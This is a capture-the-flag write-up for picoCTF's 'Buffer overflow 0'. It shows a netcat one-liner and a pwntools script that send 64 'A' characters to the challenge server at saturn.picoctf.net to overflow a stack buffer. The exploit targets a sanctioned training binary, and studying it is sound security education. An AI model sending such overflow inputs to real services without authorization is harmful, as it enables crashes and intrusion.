# Buffer overflow 0
## Description
Smash the stack
Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here. And connect with it using: `nc saturn.picoctf.net 51532`

# Solution
There is two ways to solve this challenge, one is to use the terminal and the other is to use a script.

## Using netcat and terminal
Open the terminal and write the following command:
```bash
nc saturn.picoctf.net 51532 <<<  $(python -c 'print("A" * 64)')
```

## Using pwntools
```python
# import pwntools
from pwn import *

# open up remote connection
r = remote('saturn.picoctf.net', 51532)

# get to vulnerability
r.recvuntil(b"Input:")

# send string to print stack
r.sendline(b"A" * 64)

# print the response
print(r.recvline().decode())
```
